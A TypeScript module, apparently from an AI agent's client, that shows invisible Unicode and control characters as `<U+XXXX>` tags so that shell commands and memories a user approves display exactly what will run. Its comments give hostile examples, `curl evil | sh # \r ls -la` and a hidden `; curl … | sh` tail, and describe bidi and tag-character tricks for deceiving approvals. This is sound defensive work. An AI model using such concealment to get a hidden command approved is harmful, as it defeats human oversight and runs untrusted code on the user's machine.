/**
 * Make the characters a reader can't see, visible: what an approval shows must be
 * exactly what runs.
 *
 * A model (or a page, file or tool result it read) writes the command a user is asked
 * to approve. Characters that draw nothing, or that move what is drawn, let that text
 * look like something other than what the shell receives:
 *
 *  - control characters: a carriage return or an erase-line escape repaints the line
 *    in a terminal, so `curl evil | sh # \r ls -la` reads as `ls -la`; in a browser
 *    they are simply invisible;
 *  - bidirectional controls (embeddings, overrides, isolates, marks) reorder what is
 *    displayed without changing what is executed (the "Trojan Source" trick);
 *  - zero-width and other invisible format characters, and Unicode tag characters,
 *    hide content between visible letters.
 *
 * Every such code point is shown as `<U+XXXX>`, so nothing is removed (removing a
 * character would also misreport the command) and nothing is hidden. Newlines and tabs
 * are layout, so {@link revealControls} keeps them unless told otherwise; the caller
 * decides how to lay multiple lines out. Shared by the desktop's approval card, the
 * terminal and the editor (ACP) client, so all of them show a command the same way.
 */

/** `<U+202E>` for a code point: the visible stand-in for an invisible character. */
export function codePointTag(cp: number): string {
  return `<U+${cp.toString(16).toUpperCase().padStart(4, '0')}>`
}

// C0 except tab and line feed, DEL, and C1 (the 8-bit CSI/OSC/DCS introducers). The
// carriage return is in here on purpose: it is the one that repaints a terminal line.
// eslint-disable-next-line no-control-regex -- matching control characters is the point
const CONTROL = /[\x00-\x08\x0b-\x1f\x7f-\x9f]/g
// eslint-disable-next-line no-control-regex -- as above, with tab and line feed too
const CONTROL_ALL = /[\x00-\x1f\x7f-\x9f]/g

/**
 * Format characters that draw nothing or reorder what is drawn: the Arabic letter mark,
 * the Mongolian vowel separator, zero-width space/non-joiner/joiner, the LRM/RLM marks,
 * the line and paragraph separators (a line break to some renderers, nothing to
 * others), bidi embeddings/overrides (U+202A-202E) and isolates (U+2066-2069), the word
 * joiner and invisible operators, the BOM / zero-width no-break space, interlinear
 * annotation marks, tag characters (U+E0000-E007F, which can spell out hidden ASCII),
 * and the variation-selector supplement (U+E0100-E01EF, used the same way).
 */
const INVISIBLE =
  // eslint-disable-next-line no-misleading-character-class -- each code point is matched on its own, on purpose: a variation selector is one of the characters to show
  /[\u061c\u180e\u200b-\u200f\u2028\u2029\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff\ufff9-\ufffb\u{e0000}-\u{e007f}\u{e0100}-\u{e01ef}]/gu

const tagMatch = (ch: string): string => codePointTag(ch.codePointAt(0) ?? 0)

/** Replace bidi controls, zero-width and other invisible format characters with `<U+XXXX>`. */
export function revealInvisible(s: string): string {
  return s.replace(INVISIBLE, tagMatch)
}

/**
 * Replace control characters with `<U+XXXX>`. Newlines and tabs stay by default (they
 * are layout); `keepLines: false` tags them too, for text that must stay on one line.
 */
export function revealControls(s: string, opts: { keepLines?: boolean } = {}): string {
  return s.replace(opts.keepLines === false ? CONTROL_ALL : CONTROL, tagMatch)
}

/**
 * The text exactly as it will be used, with every invisible or display-altering code
 * point shown as `<U+XXXX>` and only newlines and tabs left as they are. For anything a
 * user approves: a shell command, a memory about to be saved.
 */
export function visibleText(s: string): string {
  return revealInvisible(revealControls(s))
}

/** Whether {@link visibleText} would change `s`: it holds a character the reader can't see. */
export function hasHiddenCharacters(s: string): boolean {
  return visibleText(s) !== s
}

/** One part of what an approval is about, shown in full under the prompt. */
export interface ApprovalSubjectPart {
  /** What the part is ("Command", "Memory"), for a label above it. */
  label: string
  /** The raw text, exactly as the tool receives it; render it through {@link visibleText}. */
  text: string
}

/**
 * The free text an approval is really about, for the tools whose one-line summary
 * can't carry it: a shell command (the row folds it to one line and cuts it to fit, so a
 * `; curl … | sh` tail would sit past the ellipsis), and a memory about to be saved (the
 * summary names it, but what persists into every later session is its description and
 * body). Empty for every other tool, whose target (a path, a URL) already says it.
 */
export function approvalSubject(name: string, args: Record<string, unknown> | undefined): ApprovalSubjectPart[] {
  const a = args ?? {}
  const text = (v: unknown): string => (typeof v === 'string' ? v : '')
  switch (name) {
    case 'run_shell': {
      const command = text(a.command)
      return command ? [{ label: a.background === true ? 'Command (runs in the background)' : 'Command', text: command }] : []
    }
    case 'memory_save': {
      const parts: ApprovalSubjectPart[] = []
      if (text(a.description)) parts.push({ label: 'Description', text: text(a.description) })
      if (text(a.body)) parts.push({ label: 'Memory', text: text(a.body) })
      return parts
    }
    default:
      return []
  }
}
